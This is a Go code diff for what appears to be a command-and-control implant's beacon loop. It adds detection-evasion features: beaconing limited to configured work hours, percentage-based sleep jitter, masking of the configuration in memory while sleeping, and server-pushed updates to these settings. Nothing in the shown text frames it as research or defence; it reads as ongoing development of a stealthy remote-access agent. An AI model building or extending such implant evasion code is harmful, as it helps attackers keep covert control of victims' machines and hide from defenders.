@@ -45,15 +45,30 @@ func Loop(client *comms.Client, wsClient *comms.WSClient, cfg *config.Config) er
 	}
 
 	for {
+		// Check work hours
+		if cfg.WorkHours.Enabled {
+			now := time.Now().Hour()
+			if now < cfg.WorkHours.Start || now >= cfg.WorkHours.End {
+				log.Printf("[SCHED] Outside work hours (%d-%d). Sleeping for 1 hour...\n", cfg.WorkHours.Start, cfg.WorkHours.End)
+				time.Sleep(1 * time.Hour)
+				continue
+			}
+		}
+
 		// Calculate next sleep
-		sleepDuration := randomInterval(cfg.BeaconMin, cfg.BeaconMax)
+		sleepDuration := calculateNextSleep(cfg.BeaconMin, cfg.Jitter)
 		log.Printf("[BEACON] Next heartbeat in %ds...\n", int(sleepDuration.Seconds()))
 		
 		timer := time.NewTimer(sleepDuration)
 
+		// Mask configuration before sleep
+		cfg.Mask()
+
 		select {
 		case <-timer.C:
-			// Regular beacon
+			// Unmask to perform heartbeat
+			cfg.Unmask()
+			
 			log.Println("[BEACON] Sending heartbeat...")
 			resp, err := client.Beacon()
 			if err != nil {
@@ -69,7 +84,9 @@ func Loop(client *comms.Client, wsClient *comms.WSClient, cfg *config.Config) er
 			}
 
 		case task := <-wsClient.TaskChan:
-			// Real-time task via WebSocket
+			// Unmask to process real-time task
+			cfg.Unmask()
+			
 			log.Printf("[WS] Processing real-time task: %s\n", task.ID[:8])
 			processTask(task, client, cfg)
 		}
@@ -114,19 +131,50 @@ func handleSleepUpdate(task *comms.TaskPayload, cfg *config.Config) {
 		newInterval := int(interval)
 		if newInterval > 0 {
 			cfg.BeaconMin = newInterval
-			cfg.BeaconMax = newInterval + (newInterval / 3) // 33% jitter
-			log.Printf("[CONFIG] Beacon interval updated: %d-%ds\n", cfg.BeaconMin, cfg.BeaconMax)
+			log.Printf("[CONFIG] Beacon interval updated: %ds\n", cfg.BeaconMin)
 		}
+	}
+
+	if jitter, ok := payload["jitter"].(float64); ok {
+		cfg.Jitter = int(jitter)
+		log.Printf("[CONFIG] Jitter updated: %d%%\n", cfg.Jitter)
+	}
+
+	if workHours, ok := payload["work_hours"].(map[string]interface{}); ok {
+		if enabled, ok := workHours["enabled"].(bool); ok {
+			cfg.WorkHours.Enabled = enabled
+		}
+		if start, ok := workHours["start"].(float64); ok {
+			cfg.WorkHours.Start = int(start)
+		}
+		if end, ok := workHours["end"].(float64); ok {
+			cfg.WorkHours.End = int(end)
+		}
+		log.Printf("[CONFIG] Work hours updated: %v\n", cfg.WorkHours)
 	}
 }
 
-// randomInterval returns a random duration between min and max seconds
-func randomInterval(min, max int) time.Duration {
-	if min >= max {
-		return time.Duration(min) * time.Second
+// calculateNextSleep returns a duration based on interval and jitter percentage
+func calculateNextSleep(interval int, jitterPct int) time.Duration {
+	if jitterPct <= 0 {
+		return time.Duration(interval) * time.Second
 	}
-	n := min + rand.Intn(max-min)
-	return time.Duration(n) * time.Second
+
+	// Calculate jitter range
+	jitterRange := float64(interval) * (float64(jitterPct) / 100.0)
+	if jitterRange <= 0 {
+		return time.Duration(interval) * time.Second
+	}
+
+	// Add or subtract up to jitterRange
+	offset := (rand.Float64() * 2 * jitterRange) - jitterRange
+	final := float64(interval) + offset
+
+	if final < 1 {
+		final = 1
+	}
+
+	return time.Duration(final) * time.Second
 }
 
 // FormatDuration formats a duration for logging
